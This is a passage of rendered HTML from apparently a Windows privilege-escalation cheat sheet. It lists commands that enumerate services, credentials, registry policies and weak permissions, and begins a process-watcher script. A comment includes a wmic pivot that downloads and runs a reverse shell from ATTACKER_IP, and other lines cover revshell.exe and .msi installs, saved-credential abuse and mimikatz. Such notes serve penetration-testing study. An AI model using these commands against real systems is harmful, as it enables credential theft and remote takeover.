alternatively\u003c/span\u003e\nwmic service \u003cspan class=\"pl-k\"\u003ewhere\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003estarted=true and not pathname like 'C:\\\\Windows\\\\System32\\\\%'\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e get name\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003epathname\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e old school way\u003c/span\u003e\ntasklist \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003esvc\nnet start\nsc queryex type\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e service state\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e active\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e List all services\u003c/span\u003e\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eget-service\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\nsc queryex type\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e service state\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e all\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e names only\u003c/span\u003e\nsc queryex type\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e service state\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e all \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e find \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ei \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eSERVICE_NAME:\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Stopped services\u003c/span\u003e\nsc queryex type\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e service state\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e inactive\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Check a service's config settings (look for unquoted service path in BINARY_PATH_NAME)\u003c/span\u003e\nsc qc SERVICENAME\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check powershell history\u003c/span\u003e\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-c1\"\u003eGet-History\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e locate PowerShell logfile (PSReadline)\u003c/span\u003e\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e(Get-PSReadlineOption).HistorySavePath\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if you get a path, use type to view the file\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check if heavier PowerShell logging is enabled\u003c/span\u003e\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if so, view powershell command history with:\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-WinEvent\u003c/span\u003e Microsoft\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eWindows\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePowerShell\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eOperational \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eWhere-Object\u003c/span\u003e Id \u003cspan class=\"pl-k\"\u003e-eq\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e4104\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e select message \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e fl\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e search powershell history for secrets:\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-WinEvent\u003c/span\u003e Microsoft\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eWindows\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePowerShell\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eOperational \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eWhere-Object\u003c/span\u003e Id \u003cspan class=\"pl-k\"\u003e-eq\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e4104\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e select message \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eSelect-String\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePattern \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003esecret\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e also try 'secur' and 'passw'\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e User files that may have juicy data\u003c/span\u003e\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eGet-ChildItem -Path C:\\Users\\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.gpg,*.kdbx,*.ini,*.pst,*.ost,*.eml,*.msg,*.log,id_* -File -Recurse -ErrorAction SilentlyContinue\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e alternative\u003c/span\u003e\ndir \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ea\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ed \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eb C:\\users \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e findstr \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eilvC:\\AppData\\ \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eC:\\desktop.ini \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eC:\\ntuser.dat \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eC:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\\All Users\\VMware\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eC:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\\All Users\\USOShared\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eC:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\\All Users\\Package\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eC:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\\All Users\\Microsoft\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Check if plaintext creds stored by Wdigest (key exists, not set to 0)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e typically only common in Windows 7 and earlier\u003c/span\u003e\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev UseLogonCredential\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e LSA Protection enabled (key set to 1)?\u003c/span\u003e\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev RunAsPPL\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Credential Guard enabled (key set to 1 or 2)\u003c/span\u003e\nreg query HKLM\\System\\CurrentControlSet\\Control\\LSA \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev LsaCfgFlags\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e win11 automatic virtualization based security enabled:\u003c/span\u003e\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0 \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev IsolatedCredentialsRootSecret\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e virualization based security enabled:\u003c/span\u003e\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev EnableVirtualizationBasedSecurity\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e secure boot enabled:\u003c/span\u003e\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev RequirePlatformSecurityFeatures\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e List saved credentials\u003c/span\u003e\ncmdkey \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003elist\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if found, might be able to pivot with:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e wmic /node:VICTIM_IP process call create \"cmd /c powershell -nop -noni -exec bypass -w hidden -c \\\"IEX((new-object net.webclient).downloadstring('http://ATTACKER_IP/rsh.ps1'))\\\"\"\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or steal creds with mimikatz\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Run executable with saved creds (assuming listed in cmdkey output)\u003c/span\u003e\nrunas \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003esavecred \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003euser:admin C:\\Users\\Public\\\u003cspan class=\"pl-c1\"\u003erevshell.exe\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check account policy (lockout threshold)\u003c/span\u003e\nnet accounts\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e If both registry keys are set with DWORD values of 1, low-priv users can install *.msi files as NT AUTHORITY\\SYSTEM\u003c/span\u003e\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev AlwaysInstallElevated\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to pwn: msiexec /quiet /qn /i C:\\Users\\Public\\revshell.msi\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Does it have AutoRuns with weak permissions?\u003c/span\u003e\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e is UAC enabled? EnableLUA = 0x1 means enabled.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e ConsentPromptBehaviorAdmin = 0x5 is default, requires UAC bypass with MS-signed binary using autoelevate\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Bad = ConsentPrompt == 2 \u0026amp;\u0026amp; SecureDesktopPrompt == 1 (UAC is set to 'Always Notify')\u003c/span\u003e\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev EnableLUA\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev ConsentPromptBehaviorAdmin\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev PromptOnSecureDesktop\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Can you control the registry of services?\u003c/span\u003e\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eGet-Acl -Path hklm:\\System\\CurrentControlSet\\services\\regsvc | fl\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if NT AUTHORITY\\INTERACTIVE has \"FullContol\", can pwn with:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e see section: Windows Service Escalation - Registry\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Can you put programs in the global startup folder?\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eicacls.exe\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look for (F), full access, or (W), write access\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e exploit by dropping reverse shell exe there, wait for admin to log in.\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Do we have access to the SAM database? CVE-2021-36934, https://www.kb.cert.org/vuls/id/506989\u003c/span\u003e\nicacls \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003ewindir\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\system32\\config\\sam\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Vulnerable to Print NightMare (CVE-2021-1675, CVE-2021-34527)?\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Check running Print Spooler service using WMIC\u003c/span\u003e\nwmic service list brief \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e findstr \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eSpool\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\npowershell \u003cspan class=\"pl-c1\"\u003eGet-Service\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ePrint Spooler\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Check Registry to ensure NoWarningNoElevationOnInstall and UpdatePromptSettings\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e either don't exist or are set to 0\u003c/span\u003e\nreg query \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eHKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\\NoWarningNoElevationOnInstall\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\nreg query \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eHKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\\UpdatePromptSettings\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\npowershell gci \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eHKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e is WSL installed?\u003c/span\u003e\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eGet-ChildItem HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Lxss | %{Get-ItemProperty \u003cspan class=\"pl-c1\"\u003e$_\u003c/span\u003e.PSPath} | out-string -width 4096\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Check the powershell version\u003c/span\u003e\npowershell \u003cspan class=\"pl-c1\"\u003e$PSVersionTable\u003cspan class=\"pl-smi\"\u003e.PSVersion\u003c/span\u003e\u003c/span\u003e\npowershell (\u003cspan class=\"pl-c1\"\u003eGet-Host\u003c/span\u003e).Version\npowershell \u003cspan class=\"pl-c1\"\u003e$host\u003cspan class=\"pl-smi\"\u003e.Version\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Determine .NET version on machine (useful for running C# exploits)\u003c/span\u003e\ndir C:\\windows\\microsoft.net\\framework\\\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Drivers\u003c/span\u003e\ndriverquery\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Kernel Drivers (for exploit?)\u003c/span\u003e\ndriverquery \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e findstr Kernel\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Filesystem drivers\u003c/span\u003e\ndriverquery \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e findstr \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eFile System\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.1.1 Watching for Windows Process to run\u003c/h3\u003e\u003ca id=\"user-content-411-watching-for-windows-process-to-run\" class=\"anchor\" aria-label=\"Permalink: 4.1.1 Watching for Windows Process to run\" href=\"#411-watching-for-windows-process-to-run\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYo can use WMI (CIM in PowerShell) to watch for a process to be executed:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Watches for a process with a given name to start running (or otherwise change)\n# reference: https://petri.com/process-monitoring-powershellGetOwner\n\n$poll = 1\n$targetName = \u0026quot;backup.exe\u0026quot; # name of process to watch for\n$logPath= \u0026quot;C:\\Users\\yoshi\\Desktop\\NewProcessLog.txt\u0026quot; # where to log hits\n$query = \u0026quot;Select * from CIM_InstModification within $poll where TargetInstance ISA 'Win32_Process' AND TargetInstance.Name LIKE '%$targetName%'\u0026quot;\n$action={\n    # log to a file\n    $date = Get-Date\n    $process = $Event.SourceEventArgs.NewEvent.SourceInstance\n    $owner = Invoke-CimMethod -InputObject $process -MethodName GetOwner\n    $logText = \u0026quot;\u0026quot;\n    $logText += \u0026quot;[$date] Computername = $($process.CSName)`r`n\u0026quot;\n    $logText += \u0026quot;[$date] Process = $($process.Name)`r`n\u0026quot;\n    $logText += \u0026quot;[$date] Owner = $($owner.Domain)\\$($owner.User)`r`n\u0026quot;\n    $logText += \u0026quot;[$date] Command = $($process.Commandline)`r`n\u0026quot;\n    $logText += \u0026quot;[$date] PID = $($process.ProcessID)`r`n\u0026quot;\n    $logText += \u0026quot;[$date] PPID = $($process.ParentProcessID)`r`n\u0026quot;\n    $logText += \u0026quot;[$date] $('*' * 60)`r`n\u0026quot;\n    $logText | Out-File -FilePath $logPath -Append -Encoding ascii\n}\nRegister-CimIndicationEvent -Query $query -SourceIdentifier \u0026quot;WatchProcess\u0026quot; -Action $action\n\n# to Unsubscribe:\n# Get-EventSubscriber -SourceIdentifier \u0026quot;WatchProcess\u0026quot; | Unregister-Event\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Watches for a process with a given name to start running (or otherwise change)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e reference: https://petri.com/process-monitoring-powershellGetOwner\u003c/span\u003e\n\n\u003cspan class=\"pl-smi\"\u003e$poll\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$targetName\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ebackup.exe\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e name of process to watch for\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$logPath\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eC:\\Users\\yoshi\\Desktop\\NewProcessLog.txt\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e where to log hits\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$query\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eSelect * from CIM_InstModification within \u003cspan class=\"pl-smi\"\u003e$poll\u003c/span\u003e where TargetInstance ISA 'Win32_Process' AND TargetInstance.Name LIKE '%\u003cspan class=\"pl-smi\"\u003e$targetName\u003c/span\u003e%'\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$action\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e{\n    \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e log to a file\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003e$date\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eGet-Date\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003e$process\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$Event\u003cspan class=\"pl-smi\"\u003e.SourceEventArgs.NewEvent.SourceInstance\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003e$owner\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eInvoke-CimMethod\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eInputObject \u003cspan class=\"pl-smi\"\u003e$process\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eMethodName GetOwner\n    \u003cspan class=\"pl-smi\"\u003e$logText\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003e$logText\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e+=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e[\u003cspan class=\"pl-smi\"\u003e$date\u003c/span\u003e] Computername = \u003cspan class=\"pl-k\"\u003e\u003cspan class=\"pl-pse\"\u003e$\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$process\u003cspan class=\"pl-smi\"\u003e.CSName\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e`r`n\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003e$logText\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e+=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e[\u003cspan class=\"pl-smi\"\u003e$date\u003c/span\u003e] Process = \u003cspan class=\"pl-k\"\u003e\u003cspan class=\"pl-pse\"\u003e$\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$process\u003cspan class=\"pl-smi\"\u003e.Name\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e`r`n\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003e$logText\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e+=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e[\u003cspan class=\"pl-smi\"\u003e$date\u003c/span\u003e] Owner = \u003cspan class=\"pl-k\"\u003e\u003cspan class=\"pl-pse\"\u003e$\u003c/span\u003e\u003c/span\u003e\u003cspan 